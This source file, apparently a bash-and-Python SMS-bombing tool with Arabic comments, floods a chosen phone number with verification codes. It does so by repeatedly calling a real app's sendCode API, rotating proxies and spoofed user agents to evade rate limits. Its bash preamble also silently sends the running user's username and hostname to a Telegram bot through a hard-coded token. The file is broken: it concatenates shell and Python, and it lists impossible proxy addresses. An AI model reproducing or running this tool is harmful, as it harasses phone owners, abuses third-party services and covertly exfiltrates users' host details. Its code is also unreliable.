#تم انشاء لاداه بواسطة بلاك توشكا و تم تطويرها من الساموراي 
#!/bin/bash
#!/bin/bash

# النسخة الحالية
CURRENT_VERSION="1.0"

# رابط ملفات التحكم
REPO_URL="https://raw.githubusercontent.com/EL-Samurai-Hacking/Spam-SMS/main"

# HWID مناسب لكل الأنظمة (تيرمكس وغيره)
HWID=$(whoami)@$(uname -n)

# 1. التحقق من إيقاف الأداة
STATUS=$(curl -s "$REPO_URL/status.txt")
if [[ "$STATUS" == "off" ]]; then
    echo "The tool has been temporarily discontinued by the developer."
    exit
fi

# 2. فحص التحديث الإجباري
REMOTE_VERSION=$(curl -s "$REPO_URL/version.txt")
if [[ "$CURRENT_VERSION" != "$REMOTE_VERSION" ]]; then
    echo "There is a new update for the tool. Please download from:"
    echo "https://github.com/EL-Samurai-Hacking/Spam-SMS"
    exit
fi

# 3. التحقق من الحظر
BAN_LIST=$(curl -s "$REPO_URL/banlist.txt")
if echo "$BAN_LIST" | grep -q "$HWID"; then
    echo "You have been blocked from using the tool.."
    exit
fi

# 4. فحص كلمة المرور
PASSWORD_ONLINE=$(curl -s "$REPO_URL/password.txt")
if [[ "$PASSWORD_ONLINE" != "" ]]; then
    echo -n "Enter your password: "
    read -s INPUT_PASSWORD
    echo
    if [[ "$INPUT_PASSWORD" != "$PASSWORD_ONLINE" ]]; then
        echo "Incorrect password❌️."
        exit
    fi
fi

# 5. إرسال HWID للأدمن
BOT_TOKEN="8121771499:AAGD9IjoPK2YBb7PsLzhyEYn7qbDJSAWUM4"
CHAT_ID="7423189963"
MESSAGE="شخص شغّل الأداة
HWID: $HWID"

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"      -d chat_id="$CHAT_ID"      -d text="$MESSAGE" > /dev/null

# 6. بدء تشغيل الأداة
echo "Verification Successful! The tool is now running..."
# هنا تضع كود الأداة الأساسي أو تستدعي سكربت آخر
import os
import time
import random
import requests
import json
from pyfiglet import Figlet
from termcolor import colored

# ألوان للطباعة
GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
RESET_COLOR = "\033[0m"
v = "=" * 20

def scrolling_text():
    """عرض نص متحرك."""
    os.system('cls' if os.name == 'nt' else 'clear')
    text = "😈 ꧁ EL Samurai ꧂ 😈"
    for i in range(50):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(" " * i + text)
        time.sleep(0.1)

# شغل النص المتحرك
scrolling_text()

# تصميم الشعار الكبير
ascii_art = Figlet(font="standard").renderText("꧁ EL Samurai ꧂")
colored_art = colored(ascii_art, "blue", attrs=["bold"])
print(colored_art)

# النصوص المرافقة
print(colored("تمت بواسطة EL Samurai ", "green", attrs=["bold"]))
print(colored("꧁ EL Samurai ꧂🚶‍♂️🙂:", "cyan", attrs=["bold", "underline"]))
print(colored("꧁ EL Samurai ꧂", "yellow", attrs=["bold", "underline"]))
print()

# البروكسيات
proxies = [
    {"http": "http://123.456.789.0:8080"},
    {"http": "http://98.765.432.1:3128"},
    {"http": "http://192.168.0.1:1080"},
    {'http': 'http://3.71.96.137:8090'},
    {'http': 'http://49.13.173.87:8081'},
    {'http': 'http://49.12.235.70:8081'},
    {'http': 'http://49.12.235.70:80'},
    {'http': 'http://49.13.173.87:80'},
    {'http': 'http://116.202.121.34:3128'},
    {"socks4": "socks4://148.72.215.230:55327"},
    {"http": "http://123.456.789.0:8080"},
    {"http": "http://98.765.432.1:3128"},
    {"http": "http://192.168.0.1:1080"},
    {'http': 'http://3.71.96.137:8090'},
    {'http': 'http://49.13.173.87:8081'},
    {'http': 'http://49.12.235.70:8081'},
    {'http': 'http://49.12.235.70:80'},
    {'http': 'http://49.13.173.87:80'},
    {'http': 'http://116.202.121.34:3128'},
    {'http': 'http://3.71.96.137:8090'},
    {"socks4": "socks4://148.72.215.230:55327"},
    {"socks4": "socks4://37.59.213.49:56887"},
    {"socks4": "socks4://200.46.30.210:4153"}
]

# قائمة User-Agent
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Linux; U; Android 8.1.0) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
]

# إدخال الرقم مع رمز الدولة وعدد المحاولات
number = input(colored("Enter Your Number  (e.g., 01XXXXXXXXXX): ", "green", attrs=["bold"]))
repeat_count = int(input(colored("Enter the number of requests to send: ", "green", attrs=["bold"])))

url = "https://api.twistmena.com/music/Dlogin/sendCode"

payload = json.dumps({
    "dial": f"2{number}"
})

# متغيرات لحساب النتائج
success_count = 0
failure_count = 0

for i in range(repeat_count):
    proxy = random.choice(proxies)  # اختيار بروكسي عشوائي
    user_agent = random.choice(user_agents)  # اختيار User-Agent عشوائي

    headers = {
        'User-Agent': user_agent,
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'tgdeviceid': "",
        'app_version': "10.10.10",
        'device_token': "",
        'appversion': "10.10.10",
        'channel': "mobileapp",
        'access-token': "",
        'platform': "android",
        'tg-token': "",
        'accept-language': "ar",
        'tg-refresh-token': "",
    }

    try:
        response = requests.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
        status = response.json()["responseHeader"]['status']
        print(f"{GREEN}SUCCESS: {status}{RESET_COLOR}")
        success_count += 1  # زيادة عدد الرسائل الناجحة
    except Exception as e:
        print(f"{RED}Request failed: {e}{RESET_COLOR}")
        failure_count += 1  # زيادة عدد الرسائل الفاشلة

    time.sleep(random.uniform(1, 2))  # تأخير عشوائي بين الطلبات

fal = ("=" * 20)
# طباعة عدد الرسائل الناجحة والفاشلة
print("\033[1;31m")
print(v * 3)
print("\033[1;31m")
print(f"{CYAN}Total successful requests: {success_count}{RESET_COLOR}")
print(v * 3)
print(f"{RED}Total failed requests: {failure_count}{RESET_COLOR}")
print(fal * 3)

#تم انشاء لاداه بواسطة بلاك توشكا و تم تطويرها من الساموراي 